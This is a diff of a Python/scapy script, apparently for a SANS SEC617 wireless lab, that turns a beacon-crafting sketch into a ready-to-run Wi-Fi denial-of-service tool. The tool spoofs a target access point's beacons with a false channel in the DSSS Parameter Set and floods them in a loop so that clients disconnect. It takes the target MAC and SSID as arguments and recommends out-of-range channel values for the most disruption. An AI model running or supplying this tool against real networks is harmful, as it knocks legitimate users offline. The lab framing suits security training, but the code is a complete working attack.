@@ -1,46 +1,108 @@
-#! /usr/bin/python
-from scapy.all import Dot11,Dot11Beacon,Dot11Elt,RadioTap,sendp,hexdump,wrpcap
+#!/usr/bin/env python3
+"""
+Beacon DS-Parameter-Set DoS.
+
+Spoofs beacon frames for a target SSID/BSSID while advertising a *different*
+channel in the DSSS Parameter Set IE (element ID 3). Stations that trust the
+announced channel will retune away from their real AP and lose connectivity
+until they re-scan and re-associate.
+
+Run on a monitor-mode interface tuned to the AP's *real* channel. The value
+passed with -c/--channel is the *lie* injected into the DSSS Parameter Set.
+
+Authorized SANS SEC617 lab use only.
+"""
+
 import argparse
 
-ap = argparse.ArgumentParser()
-ap.add_argument("-a", "--ap", required=True, help="Target AP MAC address")
-ap.add_argument("-s", "--ssid", required=True, help="Target AP SSID")
-ap.add_argument("-i", "--interface", required=True, help="Monitor mode interfaceon the correct victim channel")
-ap.add_argument("-c", "--channel", required=True, help="desired spoofed channel")
-
-args = ap.parse_args()
-
-netSSID = 'testSSID'       #Network name here
-iface = 'wlan0mon'         #Interface name here
-
-dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=args.ap, addr3=args.ap)
-beacon = Dot11Beacon(cap='ESS+privacy')
-essid = Dot11Elt(ID='SSID',info=args.ssid, len=len(args.ssid))
-rsn = Dot11Elt(ID='RSNinfo', info=(
-'\x01\x00'                 #RSN Version 1
-'\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
-'\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
-'\x00\x0f\xac\x04'         #AES Cipher
-'\x00\x0f\xac\x02'         #TKIP Cipher
-'\x01\x00'                 #1 Authentication Key Managment Suite (line below)
-'\x00\x0f\xac\x02'         #Pre-Shared Key
-'\x00\x00'))               #RSN Capabilities (no extra capabilities)
-channel = Dot11Elt(info='\\x01\', ID=, len=1)
+from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp
 
 
-packet = RadioTap()/dot11/beacon/essid/rsn/channel
+# RSN IE describing WPA2-PSK with CCMP+TKIP pairwise and TKIP group. Kept
+# verbatim from the original lab so a spoofed beacon for a "privacy" network
+# still parses cleanly on the client side.
+RSN_INFO = (
+    b"\x01\x00"          # RSN version 1
+    b"\x00\x0f\xac\x02"  # Group cipher suite: TKIP
+    b"\x02\x00"          # Pairwise cipher count = 2
+    b"\x00\x0f\xac\x04"  # Pairwise: CCMP/AES
+    b"\x00\x0f\xac\x02"  # Pairwise: TKIP
+    b"\x01\x00"          # AKM count = 1
+    b"\x00\x0f\xac\x02"  # AKM: PSK
+    b"\x00\x00"          # RSN capabilities
+)
 
 
-# packet = Dot11(proto=0, FCfield=0, subtype=8, addr4=None, addr2='58:6d:8f:07:4e:8f', addr3='58:6d:8f:07:4e:8f', addr1='ff:ff:ff:ff:ff:ff', SC=11312, type=0, ID=0)/Dot11Beacon(timestamp=2500201043, cap=4352, beacon_interval=100)/Dot11Elt(info='voip', ID=0, len=4)/Dot11Elt(info='\\x82\\x84\\x8b\\x96', ID=1, len=4)/Dot11Elt(info='\\x01', ID=3, len=1)/Dot11Elt(info='\\x00\\x01\\x00\\x00', ID=5, len=4)/Dot11Elt(info='\\x00\\x10\\x18\\x02\\x01\\xf0\\x04\\x00\\x00', ID=221, len=9)/Dot11Elt(info="\\x00P\\xf2\\x02\\x01\\x01\\x80\\x00\\x03\\xa4\\x00\\x00\'\\xa4\\x00\\x00BC\\xbc\\x00b2f\\x00", ID=221, len=24)
+def build_beacon(bssid: str, ssid, channel: int, privacy: bool) -> RadioTap:
+    cap = "ESS+privacy" if privacy else "ESS"
+    ssid_bytes = ssid if isinstance(ssid, (bytes, bytearray)) else ssid.encode()
+
+    dot11 = Dot11(
+        type=0, subtype=8,
+        addr1="ff:ff:ff:ff:ff:ff",
+        addr2=bssid,
+        addr3=bssid,
+    )
+    beacon = Dot11Beacon(cap=cap)
+    essid = Dot11Elt(ID="SSID", info=ssid_bytes, len=len(ssid_bytes))
+    rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96")  # 1,2,5.5,11 Mbps (basic)
+    dsset = Dot11Elt(ID="DSset", info=bytes([channel]), len=1)
+
+    frame = RadioTap() / dot11 / beacon / essid / rates / dsset
+    if privacy:
+        frame = frame / Dot11Elt(ID="RSNinfo", info=RSN_INFO)
+    return frame
 
 
-# packet = Dot11(proto=0, FCfield=0, subtype=8, addr4=None, addr2=args.ap, addr3=args.ap, addr1='ff:ff:ff:ff:ff:ff', SC=11312, type=0, ID=0)/Dot11Beacon(timestamp=2500201043, cap=4352, beacon_interval=100)/Dot11Elt(info=args.ssid, ID=0, len=len(args.ssid))/Dot11Elt(info='\\x82\\x84\\x8b\\x96', ID=1, len=4)/Dot11Elt(info=args.channel, ID=3, len=len(args.channel))/Dot11Elt(info='\\x00\\x01\\x00\\x00', ID=5, len=4)/Dot11Elt(info='\\x00\\x10\\x18\\x02\\x01\\xf0\\x04\\x00\\x00', ID=221, len=9)/Dot11Elt(info='\\x00P\\xf2\\x02\\x01\\x01\\x80\\x00\\x03\\xa4\\x00\\x00\\xa4\\x00\\x00BC\\xbc\\x00b2f\\x00', ID=221, len=24)
+def parse_args() -> argparse.Namespace:
+    p = argparse.ArgumentParser(
+        description=__doc__,
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    p.add_argument("-a", "--ap", required=True, help="Target AP MAC (BSSID)")
+    p.add_argument("-s", "--ssid", required=True, help="Target AP SSID")
+    p.add_argument("-i", "--interface", required=True,
+                   help="Monitor-mode interface (tuned to the AP's real channel)")
+    p.add_argument("-c", "--channel", required=True, type=int,
+                   help="Spoofed channel value injected into the DSSS Parameter "
+                        "Set (1-255). Values >14 are out of standard range and "
+                        "particularly effective at confusing clients -- the "
+                        "SEC617 reference example uses 238.")
+    p.add_argument("--no-privacy", action="store_true",
+                   help="Drop the privacy bit and the RSN IE (advertise an open network)")
+    p.add_argument("--interval", type=float, default=0.1,
+                   help="Inter-frame interval in seconds (default 0.1, ~10/sec)")
+    p.add_argument("--count", type=int, default=0,
+                   help="Number of beacons to send (0 = run until Ctrl-C)")
+    p.add_argument("-y", "--yes", action="store_true",
+                   help="Skip the interactive 'press enter' prompt")
+    return p.parse_args()
 
 
+def main() -> None:
+    args = parse_args()
+    if not 1 <= args.channel <= 255:
+        raise SystemExit(f"channel {args.channel} does not fit in a single byte (1-255)")
+    if args.channel > 14:
+        print(f"[!] channel {args.channel} is outside the standard 1-14 range "
+              f"-- intentional for max client confusion (SEC617 example uses 238).")
+
+    packet = build_beacon(args.ap, args.ssid, args.channel, privacy=not args.no_privacy)
+    packet.show()
+
+    if not args.yes:
+        input(f"\nPress Enter to flood beacons on {args.interface} (Ctrl-C to stop)...")
+
+    try:
+        if args.count > 0:
+            sendp(packet, iface=args.interface, inter=args.interval,
+                  count=args.count, verbose=False)
+        else:
+            sendp(packet, iface=args.interface, inter=args.interval,
+                  loop=1, verbose=False)
+    except KeyboardInterrupt:
+        print("\nStopped.")
 
 
-packet.show()
-raw_input("\nPress enter to start\n")
-wrpcap("test.pcap",packet)
-# sendp(packet, iface=args.interface, inter=0.100, loop=1)
-
+if __name__ == "__main__":
+    main()
